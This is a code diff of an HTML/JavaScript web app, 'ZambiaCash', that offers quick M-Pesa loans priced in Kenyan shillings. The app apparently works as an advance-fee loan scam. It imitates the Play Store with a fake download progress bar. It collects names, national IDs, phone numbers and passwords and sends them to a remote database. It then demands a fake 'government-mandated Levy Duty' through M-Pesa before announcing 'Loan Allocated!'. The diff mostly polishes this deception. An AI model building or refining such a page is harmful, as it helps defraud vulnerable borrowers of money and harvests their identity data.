         <!-- BOTTOM NAVIGATION BAR -->
-        <div class="fixed bottom-0 left-0 right-0 bg-gray-50 border-t border-gray-200 flex justify-around py-2 z-50">
-            <div class="flex flex-col items-center text-gray-600">
+        <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 flex justify-around py-2.5 z-50 pb-safe">
+            <div class="flex flex-col items-center text-gray-500">
                 <svg class="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                <span class="text-[10px]">Games</span>
+                <span class="text-[10px] font-medium">Games</span>
             </div>
-            <div class="flex flex-col items-center text-gray-600">
+            <div class="flex flex-col items-center text-gray-500">
                 <svg class="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z"></path></svg>
-                <span class="text-[10px]">Apps</span>
+                <span class="text-[10px] font-medium">Apps</span>
             </div>
             <div class="flex flex-col items-center text-playBlue">
-                <div class="bg-blue-100 px-4 py-0.5 rounded-full mb-1">
+                <div class="bg-blue-100 px-5 py-1 rounded-full mb-1">
                     <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                 </div>
                 <span class="text-[10px] font-bold">Search</span>
@@ -290,124 +299,136 @@
         </div>
     </div>
 
-    <!-- 4. APP SCREENS -->
+    <!-- 3. APP SCREENS -->
     <div id="app-content" class="hide font-sans">
 
         <div id="screen-login" class="screen active gradient-bg p-6">
             <div class="flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
-                <div class="text-center mb-8">
-                    <img src="icon.png" class="w-20 h-20 rounded-2xl mx-auto shadow-xl mb-4 object-cover" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMxRTQwQUYiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZm9udC1zaXplPSI0MCIgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPlo8L3RleHQ+PC9zdmc+'">
-                    <h1 class="text-white text-3xl font-extrabold">ZambiaCash</h1>
-                    <p class="text-blue-200 text-sm mt-1">Quick loans in minutes</p>
+                <div class="text-center mb-10">
+                    <div class="w-24 h-24 bg-white/10 rounded-3xl mx-auto backdrop-blur-md flex items-center justify-center border border-white/20 shadow-glow mb-6">
+                        <img src="icon.png" class="w-16 h-16 rounded-2xl object-cover shadow-lg" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMxRTQwQUYiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZm9udC1zaXplPSI0MCIgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPlo8L3RleHQ+PC9zdmc+'">
+                    </div>
+                    <h1 class="text-white text-3xl font-extrabold tracking-tight">ZambiaCash</h1>
+                    <p class="text-blue-200 text-sm font-medium mt-2">Quick loans in minutes</p>
                 </div>
-                <div class="card">
-                    <h2 class="text-xl font-bold mb-4">Create Account</h2>
-                    <div class="space-y-3">
+                
+                <div class="glass-card rounded-3xl p-6 shadow-2xl">
+                    <h2 class="text-xl font-bold text-slate-900 mb-5">Create Account</h2>
+                    <div class="space-y-4">
                         <div><input type="text" id="in-name" placeholder="Full Name"></div>
                         <div><input type="number" id="in-id" placeholder="National ID (7-8 digits)"></div>
                         <div><input type="tel" id="in-mpesa" placeholder="M-Pesa (0712345678)"></div>
                         <div><input type="password" id="in-pass" placeholder="Password (min 4 chars)"></div>
-                        <button onclick="submitLogin()" class="w-full bg-brandBlue text-white font-bold py-3.5 rounded-xl mt-2 shadow-lg active:scale-95 transition-transform">Create Account</button>
+                        <button onclick="submitLogin()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl mt-4 shadow-lg shadow-brandBlue/30 active:scale-95 transition-transform">Create Account</button>
                     </div>
-                    <p class="text-center text-xs text-slate-400 mt-4">🔒 Your data is encrypted and safe</p>
+                    <p class="text-center text-xs text-slate-400 mt-6 font-medium">🔒 Your data is encrypted and safe</p>
                 </div>
             </div>
         </div>
 
         <div id="screen-checking" class="screen gradient-bg p-6 items-center justify-center">
-            <img src="icon.png" class="w-24 h-24 rounded-2xl mb-8 animate-pulse object-cover">
-            <h2 class="text-white text-2xl font-bold text-center mb-2">Checking your<br>loan limit</h2>
-            <p id="check-status" class="text-blue-200 text-sm mb-8">Analyzing your profile...</p>
-            <div class="w-full max-w-xs bg-blue-900/50 rounded-full h-3 mb-2">
-                <div id="check-bar" class="bg-brandYellow h-3 rounded-full transition-all duration-100" style="width: 0%"></div>
+            <div class="w-28 h-28 bg-white/10 rounded-full flex items-center justify-center mb-8 animate-pulse border border-white/20">
+                <img src="icon.png" class="w-20 h-20 rounded-2xl object-cover">
             </div>
-            <p id="check-percent" class="text-white font-bold text-xl">0%</p>
+            <h2 class="text-white text-2xl font-bold text-center mb-2">Checking your<br>loan limit</h2>
+            <p id="check-status" class="text-blue-200 text-sm mb-8 font-medium">Analyzing your profile...</p>
+            <div class="w-full max-w-xs bg-blue-900/50 rounded-full h-3 mb-3 border border-white/10">
+                <div id="check-bar" class="bg-brandYellow h-3 rounded-full transition-all duration-100 shadow-[0_0_10px_#F59E0B]" style="width: 0%"></div>
+            </div>
+            <p id="check-percent" class="text-white font-bold text-2xl">0%</p>
         </div>
 
         <div id="screen-select" class="screen bg-slate-50 p-6">
             <div class="max-w-sm mx-auto w-full">
-                <h2 class="text-2xl font-extrabold mb-1">Choose your loan</h2>
-                <p class="text-sm text-slate-500 mb-6">Tap an amount, then choose a term</p>
-                <div class="grid grid-cols-3 gap-2 mb-6" id="amount-grid"></div>
-                <p class="font-bold text-sm mb-2">Repayment term</p>
-                <div class="flex gap-2 mb-6">
-                    <button onclick="setTerm(30)" class="term-btn selected flex-1 py-2 border-2 border-slate-200 rounded-lg font-bold text-sm">30 days</button>
-                    <button onclick="setTerm(60)" class="term-btn flex-1 py-2 border-2 border-slate-200 rounded-lg font-bold text-sm text-slate-600">60 days</button>
-                    <button onclick="setTerm(90)" class="term-btn flex-1 py-2 border-2 border-slate-200 rounded-lg font-bold text-sm text-slate-600">90 days</button>
+                <h2 class="text-2xl font-extrabold text-slate-900 mb-1">Choose your loan</h2>
+                <p class="text-sm text-slate-500 mb-6 font-medium">Tap an amount, then choose a term</p>
+                
+                <div class="grid grid-cols-3 gap-2.5 mb-8" id="amount-grid"></div>
+                
+                <p class="font-bold text-slate-900 mb-3">Repayment term</p>
+                <div class="flex gap-2.5 mb-8">
+                    <button onclick="setTerm(30)" class="term-btn selected flex-1 py-3 text-sm">30 days</button>
+                    <button onclick="setTerm(60)" class="term-btn flex-1 py-3 text-sm">60 days</button>
+                    <button onclick="setTerm(90)" class="term-btn flex-1 py-3 text-sm">90 days</button>
                 </div>
-                <div class="card bg-white space-y-3 mb-6">
-                    <div class="flex justify-between"><span class="text-slate-500 text-sm">You receive</span><span id="sum-receive" class="font-bold text-brandBlue">Ksh 1,000</span></div>
-                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Interest (10%)</span><span id="sum-interest" class="font-bold">Ksh 100</span></div>
-                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Total repayment</span><span id="sum-total" class="font-bold text-green-600">Ksh 1,100</span></div>
-                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Due date</span><span id="sum-due" class="font-bold">--</span></div>
-                    <hr class="border-slate-100">
-                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Levy Duty (one-time)</span><span id="sum-levy" class="font-bold text-brandYellow">Ksh 150</span></div>
+                
+                <div class="bg-white rounded-3xl p-6 shadow-soft space-y-4 mb-8 border border-slate-100">
+                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">You receive</span><span id="sum-receive" class="font-extrabold text-brandBlue text-lg">Ksh 1,000</span></div>
+                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Interest (10%)</span><span id="sum-interest" class="font-bold text-slate-800">Ksh 100</span></div>
+                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total repayment</span><span id="sum-total" class="font-bold text-emerald-600 text-lg">Ksh 1,100</span></div>
+                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due date</span><span id="sum-due" class="font-bold text-slate-800">--</span></div>
+                    <hr class="border-slate-100 my-2">
+                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Levy Duty (one-time)</span><span id="sum-levy" class="font-extrabold text-brandYellow text-lg">Ksh 150</span></div>
                 </div>
-                <button onclick="goToPayment()" class="w-full bg-brandBlue text-white font-bold py-3.5 rounded-xl shadow-lg active:scale-95 transition-transform">Continue</button>
+                
+                <button onclick="goToPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg shadow-brandBlue/20 active:scale-95 transition-transform">Continue</button>
             </div>
         </div>
 
         <div id="screen-payment" class="screen bg-slate-50 p-6">
             <div class="max-w-sm mx-auto w-full">
-                <div class="flex items-center gap-2 mb-4">
-                    <button onclick="showScreen('screen-select')" class="text-2xl font-bold text-brandBlue">&larr;</button>
-                    <h2 class="text-xl font-extrabold">Levy Duty Payment</h2>
+                <div class="flex items-center gap-3 mb-6">
+                    <button onclick="showScreen('screen-select')" class="w-10 h-10 bg-white rounded-full flex items-center justify-center shadow-sm text-slate-700 active:scale-95"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"></path></svg></button>
+                    <h2 class="text-xl font-extrabold text-slate-900">Levy Duty Payment</h2>
                 </div>
-                <p class="text-sm text-slate-500 mb-6">Pay the government-mandated Levy Duty to activate your loan.</p>
-                <div class="card bg-white space-y-3 mb-4">
-                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Loan amount</span><span id="pay-loan" class="font-bold">Ksh 1,000</span></div>
-                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Interest</span><span id="pay-interest" class="font-bold">Ksh 100</span></div>
-                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Total repayment</span><span id="pay-total" class="font-bold text-green-600">Ksh 1,100</span></div>
-                    <div class="flex justify-between"><span class="text-slate-500 text-sm">Due date</span><span id="pay-due" class="font-bold">--</span></div>
-                    <hr class="border-slate-100">
+                <p class="text-sm text-slate-500 mb-6 font-medium">Pay the government-mandated Levy Duty to activate your loan.</p>
+                
+                <div class="bg-white rounded-3xl p-6 shadow-soft space-y-4 mb-5 border border-slate-100">
+                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Loan amount</span><span id="pay-loan" class="font-bold text-slate-800">Ksh 1,000</span></div>
+                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Interest</span><span id="pay-interest" class="font-bold text-slate-800">Ksh 100</span></div>
+                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total repayment</span><span id="pay-total" class="font-bold text-emerald-600">Ksh 1,100</span></div>
+                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due date</span><span id="pay-due" class="font-bold text-slate-800">--</span></div>
+                    <hr class="border-slate-100 my-2">
                     <div class="flex justify-between items-center">
                         <div>
-                            <span class="text-slate-500 text-sm block">Levy Duty (pay now)</span>
-                            <span class="text-[10px] text-slate-400">Government requirement</span>
+                            <span class="text-slate-500 font-medium text-sm block">Levy Duty (pay now)</span>
+                            <span class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">Gov. requirement</span>
                         </div>
-                        <span id="pay-levy" class="font-extrabold text-brandYellow text-lg">Ksh 150</span>
+                        <span id="pay-levy" class="font-extrabold text-brandYellow text-xl">Ksh 150</span>
                     </div>
                 </div>
-                <div class="card bg-white mb-4">
-                    <p class="text-xs text-slate-500 mb-1">Account: <span id="pay-name" class="font-bold text-slate-800"></span></p>
-                    <label class="text-sm font-bold mb-1 block mt-3">M-Pesa Number</label>
+                
+                <div class="bg-white rounded-3xl p-6 shadow-soft mb-5 border border-slate-100">
+                    <p class="text-sm font-semibold text-slate-800 mb-1">Account: <span id="pay-name"></span></p>
+                    <label class="text-sm font-bold text-slate-900 mb-2 block mt-4">M-Pesa Number</label>
                     <input type="tel" id="pay-mpesa" placeholder="0712345678">
-                    <p class="text-[11px] text-slate-400 mt-1">Loan will be sent to this number</p>
+                    <p class="text-[11px] text-slate-400 mt-2 font-medium">Loan will be sent to this number</p>
                 </div>
-                <div class="bg-blue-50 text-blue-800 text-xs p-3 rounded-xl mb-6">
-                    ⚡ Your loan will be released to your M-Pesa immediately after fee payment.
+                
+                <div class="bg-blue-50 border border-blue-100 text-brandBlue text-xs p-4 rounded-2xl mb-8 flex items-start gap-3">
+                    <svg class="w-5 h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    <p class="font-medium leading-relaxed">Your loan will be released to your M-Pesa immediately after fee payment.</p>
                 </div>
-                <button onclick="processPayment()" id="btn-pay" class="w-full bg-brandBlue text-white font-bold py-3.5 rounded-xl shadow-lg active:scale-95 transition-transform">Pay Ksh 150 Levy Duty</button>
+                
+                <button onclick="processPayment()" id="btn-pay" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg shadow-brandBlue/20 active:scale-95 transition-transform">Pay Ksh 150 Levy Duty</button>
             </div>
         </div>
 
         <div id="screen-success" class="screen bg-slate-50 p-6">
-            <div class="max-w-sm mx-auto w-full text-center mt-10">
-                <div id="verify-anim" class="mb-6">
-                    <div class="w-24 h-24 border-4 border-brandBlue border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
-                    <h2 class="text-2xl font-extrabold">Verifying payment</h2>
-                    <p class="text-sm text-slate-500 mt-2">Please wait while we confirm with M-Pesa...</p>
-                    <p id="verify-time" class="text-brandYellow font-bold mt-4 text-lg">0s</p>
+            <div class="max-w-sm mx-auto w-full text-center mt-12">
+                <div id="verify-anim" class="mb-8 flex flex-col items-center">
+                    <div class="w-28 h-28 border-[6px] border-slate-200 border-t-brandBlue rounded-full animate-spin mb-6"></div>
+                    <h2 class="text-2xl font-extrabold text-slate-900">Verifying payment</h2>
+                    <p class="text-sm font-medium text-slate-500 mt-2">Please wait while we confirm with M-Pesa...</p>
+                    <p id="verify-time" class="text-brandYellow font-extrabold mt-4 text-xl bg-yellow-50 px-4 py-1 rounded-full">0s</p>
                 </div>
-                <div id="success-anim" class="hide">
-                    <div class="w-24 h-24 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4 text-5xl">✓</div>
-                    <h2 class="text-2xl font-extrabold text-green-600">Loan Allocated!</h2>
-                    <p class="text-sm text-slate-500 mt-2 mb-6">Funds have been released to your M-Pesa immediately.</p>
-                    <div class="card bg-white text-left space-y-3 mb-6">
-                        <div class="flex justify-between"><span class="text-slate-500 text-sm">Loan Amount</span><span id="suc-loan" class="font-bold">Ksh 1,000</span></div>
-                        <div class="flex justify-between"><span class="text-slate-500 text-sm">Total Repayment</span><span id="suc-total" class="font-bold">Ksh 1,100</span></div>
-                        <div class="flex justify-between"><span class="text-slate-500 text-sm">Due Date</span><span id="suc-due" class="font-bold">--</span></div>
-                        <div class="flex justify-between"><span class="text-slate-500 text-sm">M-Pesa</span><span id="suc-mpesa" class="font-bold text-brandBlue"></span></div>
+                
+                <div id="success-anim" class="hide flex flex-col items-center">
+                    <div class="w-24 h-24 bg-emerald-100 text-emerald-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl shadow-glow">✓</div>
+                    <h2 class="text-2xl font-extrabold text-slate-900">Loan Allocated!</h2>
+                    <p class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4">Funds have been released to your M-Pesa immediately.</p>
+                    
+                    <div class="bg-white rounded-3xl p-6 shadow-soft text-left w-full space-y-4 mb-8 border border-slate-100">
+                        <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Loan Amount</span><span id="suc-loan" class="font-bold text-slate-800 text-lg">Ksh 1,000</span></div>
+                        <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total Repayment</span><span id="suc-total" class="font-bold text-slate-800">Ksh 1,100</span></div>
+                        <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due Date</span><span id="suc-due" class="font-bold text-slate-800">--</span></div>
+                        <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">M-Pesa</span><span id="suc-mpesa" class="font-bold text-brandBlue"></span></div>
                     </div>
-                    <button onclick="logout()" class="w-full bg-brandBlue text-white font-bold py-3.5 rounded-xl shadow-lg active:scale-95 transition-transform">Done</button>
+                    
+                    <button onclick="logout()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition-transform">Done</button>
                 </div>
             </div>
         </div>
-    </div>
-
-    <!-- TOAST -->
-    <div id="toast" class="hide fixed top-4 left-4 right-4 z-[10001] bg-slate-900 text-white text-sm p-4 rounded-xl shadow-2xl toast">
-        <p id="toast-msg"></p>
     </div>
 
     <!-- APP LOGIC -->
@@ -437,11 +458,33 @@
             let d = new Date(); d.setDate(d.getDate() + days);
             return d.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
         };
-        function showToast(msg, duration = 4000) {
-            const toast = document.getElementById('toast');
-            document.getElementById('toast-msg').innerText = msg;
-            toast.classList.remove('hide');
-            setTimeout(() => toast.classList.add('hide'), duration);
+
+        // ==========================================
+        // CUSTOM MODAL LOGIC
+        // ==========================================
+        function showModal(title, message, type = 'info') {
+            const modal = document.getElementById('custom-modal');
+            const iconContainer = document.getElementById('modal-icon-container');
+            const icon = document.getElementById('modal-icon');
+            
+            document.getElementById('modal-title').innerText = title;
+            document.getElementById('modal-message').innerText = message;
+
+            if (type === 'success') {
+                iconContainer.className = 'w-16 h-16 rounded-full flex items-center justify-center mb-4 bg-emerald-100 text-emerald-500';
+                icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>';
+            } else if (type === 'warning') {
+                iconContainer.className = 'w-16 h-16 rounded-full flex items-center justify-center mb-4 bg-red-100 text-red-500';
+                icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>';
+            } else {
+                iconContainer.className = 'w-16 h-16 rounded-full flex items-center justify-center mb-4 bg-blue-100 text-playBlue';
+                icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>';
+            }
+
+            modal.classList.remove('hide');
+        }
+        function closeModal() {
+            document.getElementById('custom-modal').classList.add('hide');
         }
 
         // ==========================================
@@ -463,9 +506,8 @@
         window.retryConnection = function() {
             if (navigator.onLine) {
                 offlineGate.classList.add('hide');
-                showToast("✅ Connection restored!");
             } else {
-                showToast("Still offline. Please check your network settings.");
+                showModal("Still Offline", "Please check your network settings and try again.", "warning");
             }
         };
 
@@ -478,17 +520,16 @@
         const appContent = document.getElementById('app-content');
         const btnStoreInstall = document.getElementById('btn-store-install');
         
-        // Containers
         const preInstallButtons = document.getElementById('pre-install-buttons');
         const postInstallButtons = document.getElementById('post-install-buttons');
         const fakeDownloadArea = document.getElementById('fake-download-area');
         const preInstallContent = document.getElementById('pre-install-content');
         const postInstallContent = document.getElementById('post-install-content');
 
-        // Progress elements
         const circleProgress = document.getElementById('circle-progress');
         const downloadPercent = document.getElementById('download-percent');
         const downloadSize = document.getElementById('download-size');
+        const downloadStatus = document.getElementById('download-status');
 
         const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
         const ua = navigator.userAgent || navigator.vendor || window.opera;
@@ -496,7 +537,6 @@
 
         updateConnectionStatus();
 
-        // Function to switch UI to the "Installed" state
         function showInstalledState() {
             preInstallButtons.classList.add('hide');
             fakeDownloadArea.classList.add('hide');
@@ -506,7 +546,6 @@
             postInstallContent.classList.remove('hide');
         }
 
-        // Function to switch UI to the "Install" state
         function showInstallState() {
             postInstallButtons.classList.add('hide');
             postInstallContent.classList.add('hide');
@@ -523,7 +562,6 @@
         } else if (isInApp) {
             browserWarning.classList.remove('hide');
         } else {
-            // If opened in a normal browser, always show the Play Store
             playStoreGate.classList.remove('hide');
             showInstallState();
         }
@@ -535,8 +573,7 @@
 
         btnStoreInstall.addEventListener('click', async () => {
             if (!deferredPrompt) {
-                // Native alert if Chrome delays the prompt after an uninstall
-                alert("To install ZambiaCash:\n1. Tap the three dots (⋮) in Chrome.\n2. Select 'Install app' or 'Add to Home Screen'.");
+                showModal("Installation Guide", "Tap the three dots (⋮) in your browser and select 'Install app' or 'Add to Home screen'.", "info");
                 return;
             }
 
@@ -547,49 +584,53 @@
                 preInstallButtons.classList.add('hide');
                 fakeDownloadArea.classList.remove('hide');
 
-                let progress = 0;
-                const totalTicks = 100;
-                const tickMs = 300;
-                const increment = 100 / totalTicks;
+                // Hard-lock 30 seconds
+                const duration = 30000; 
+                const startTime = Date.now();
+                const circumference = 351; // 2 * PI * 56
                 
-                // Calculate circumference for SVG circle (2 * PI * r) = 2 * 3.14159 * 50 = 314.159
-                const circumference = 314.159;
-
                 const interval = setInterval(() => {
-                    progress += increment * (0.85 + Math.random() * 0.3);
-                    if (progress > 100) progress = 100;
+                    const elapsed = Date.now() - startTime;
+                    let progress = Math.min((elapsed / duration) * 100, 100);
 
                     // Update SVG ring
                     const offset = circumference - (progress / 100) * circumference;
                     circleProgress.style.strokeDashoffset = offset;
 
+                    // Update texts
                     downloadPercent.innerText = Math.floor(progress) + "%";
-
                     const downloadedMB = (1.2 + (10.0 - 1.2) * (progress / 100)).toFixed(1);
                     downloadSize.innerText = downloadedMB + " MB / 10.0 MB";
+
+                    // Change status text mid-way
+                    if (progress > 70) {
+                        downloadStatus.innerText = "Installing...";
+                    } else if (progress > 30) {
+                        downloadStatus.innerText = "Verifying files...";
+                    } else {
+                        downloadStatus.innerText = "Downloading...";
+                    }
 
                     if (progress >= 100) {
                         clearInterval(interval);
                         setTimeout(() => {
                             showInstalledState();
-                            // Native prompt instead of fake screen
-                            alert("App downloaded successfully. You can now find it on your home screen.");
-                        }, 600);
+                            showModal("App Installed Successfully", "You can now find ZambiaCash on your home screen.", "success");
+                        }, 500);
                     }
-                }, tickMs);
+                }, 100);
             } else {
-                alert("Installation is required to use ZambiaCash.");
+                showModal("Installation Required", "You must install the app to continue using ZambiaCash.", "warning");
             }
             deferredPrompt = null;
         });
 
-        // OPEN BUTTON - Shows native prompt, then redirects
+        // OPEN BUTTON
         document.getElementById('btn-open-app').addEventListener('click', () => {
-            alert("Find app in your home screen and open it from there.");
+            showModal("Open App", "You used the Play Store browser. Find the app on your home screen to open it.", "info");
             
             playStoreGate.classList.add('hide');
             
-            // Try to redirect to home screen in the background
             try { window.close(); } catch (e) {}
             const isAndroid = /android/i.test(navigator.userAgent);
             if (isAndroid) {
@@ -601,11 +642,8 @@
             }
         });
 
-        // UNINSTALL BUTTON - Resets the page back to the "Install" state
+        // UNINSTALL BUTTON - No message, just resets UI
         window.mockUninstall = function() {
-            alert("To uninstall ZambiaCash:\n1. Long-press the ZambiaCash icon on your home screen.\n2. Select 'Uninstall' or drag it to the trash bin.\n\nYou can also uninstall it from your phone's Settings > Apps.");
-            
-            // Reset the UI back to the Install state so they can install it again
             showInstallState();
         };
 
@@ -642,15 +680,13 @@
             const mpesa = document.getElementById('in-mpesa').value.trim();
             const pass = document.getElementById('in-pass').value;
 
-            if (!/^[A-Za-z][A-Za-z .'-]{2,}$/.test(name)) return alert("Enter a valid full name");
-            if (!/^\d{7,8}$/.test(id)) return alert("ID must be 7-8 digits");
-            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return alert("Enter a valid Safaricom/Airtel number");
-            if (pass.length < 4) return alert("Password must be at least 4 characters");
+            if (!/^[A-Za-z][A-Za-z .'-]{2,}$/.test(name)) return showModal("Invalid Name", "Please enter your full name.", "warning");
+            if (!/^\d{7,8}$/.test(id)) return showModal("Invalid ID", "National ID must be 7-8 digits.", "warning");
+            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return showModal("Invalid M-Pesa Number", "Please enter a valid Safaricom or Airtel number (07XX or 01XX).", "warning");
+            if (pass.length < 4) return showModal("Weak Password", "Password must be at least 4 characters.", "warning");
 
             state.name = name; state.id = id; state.mpesa = mpesa;
             localStorage.setItem('zc_user', JSON.stringify(state));
-
-            if ("Notification" in window) Notification.requestPermission();
 
             fetch(`${SUPABASE_URL}/rest/v1/users`, {
                 method: 'POST',
@@ -682,11 +718,11 @@
             grid.innerHTML = '';
             amounts.forEach(amt => {
                 const btn = document.createElement('button');
-                btn.className = `amount-btn py-3 border-2 border-slate-200 rounded-xl font-bold text-sm ${amt === state.loan ? 'selected' : 'text-slate-700'}`;
+                btn.className = `amount-btn py-3.5 text-sm ${amt === state.loan ? 'selected' : ''}`;
                 btn.innerText = amt.toLocaleString();
                 btn.onclick = () => {
-                    document.querySelectorAll('.amount-btn').forEach(b => { b.classList.remove('selected'); b.classList.add('text-slate-700'); });
-                    btn.classList.add('selected'); btn.classList.remove('text-slate-700');
+                    document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('selected'));
+                    btn.classList.add('selected');
                     state.loan = amt;
                     updateSummary();
                 };
@@ -698,8 +734,8 @@
 
         function setTerm(days) {
             state.term = days;
-            document.querySelectorAll('.term-btn').forEach(b => { b.classList.remove('selected'); b.classList.add('text-slate-600'); });
-            event.target.classList.add('selected'); event.target.classList.remove('text-slate-600');
+            document.querySelectorAll('.term-btn').forEach(b => b.classList.remove('selected'));
+            event.target.classList.add('selected');
             updateSummary();
         }
 
@@ -711,7 +747,7 @@
             let ratePct = rate * 100;
 
             document.getElementById('sum-receive').innerText = format(state.loan);
-            document.getElementById('sum-interest').parentElement.innerHTML = `<span class="text-slate-500 text-sm">Interest (${ratePct}%)</span><span class="font-bold">${format(state.interest)}</span>`;
+            document.getElementById('sum-interest').parentElement.innerHTML = `<span class="text-slate-500 font-medium text-sm">Interest (${ratePct}%)</span><span class="font-bold text-slate-800">${format(state.interest)}</span>`;
             document.getElementById('sum-total').innerText = format(state.total);
             document.getElementById('sum-due').innerText = getDueDate(state.term);
             document.getElementById('sum-levy').innerText = format(state.levy);
@@ -731,7 +767,7 @@
 
         async function processPayment() {
             const mpesa = document.getElementById('pay-mpesa').value.trim();
-            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return alert("Enter a valid M-Pesa number");
+            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return showModal("Invalid Number", "Enter a valid M-Pesa number.", "warning");
 
             document.getElementById('btn-pay').innerText = "Sending STK Push...";
             document.getElementById('btn-pay').disabled = true;
@@ -755,36 +791,23 @@
                 });
 
                 const rawText = await res.text();
-                console.log("Raw response:", rawText);
-
                 let data;
-                try {
-                    data = JSON.parse(rawText);
-                } catch (parseErr) {
-                    throw new Error("Server returned non-JSON: " + rawText.substring(0, 200));
-                }
+                try { data = JSON.parse(rawText); } catch (e) { throw new Error("Server returned non-JSON"); }
 
                 if (!res.ok) {
-                    let errorMsg;
-                    if (typeof data.error === 'string') errorMsg = data.error;
-                    else if (data.error && typeof data.error === 'object') errorMsg = data.error.message || JSON.stringify(data.error);
-                    else if (typeof data.message === 'string') errorMsg = data.message;
-                    else if (typeof data === 'string') errorMsg = data;
-                    else errorMsg = JSON.stringify(data);
+                    let errorMsg = typeof data.error === 'string' ? data.error : JSON.stringify(data);
                     throw new Error(`[${res.status}] ${errorMsg}`);
                 }
 
                 const txnId = data.data?.transactionId || data.data?.transaction_id || data.transactionId || data.transaction_id || data.id;
-                if (!txnId) throw new Error("No transaction ID in response: " + JSON.stringify(data));
+                if (!txnId) throw new Error("No transaction ID in response");
 
                 localStorage.setItem('inflight_txn', txnId);
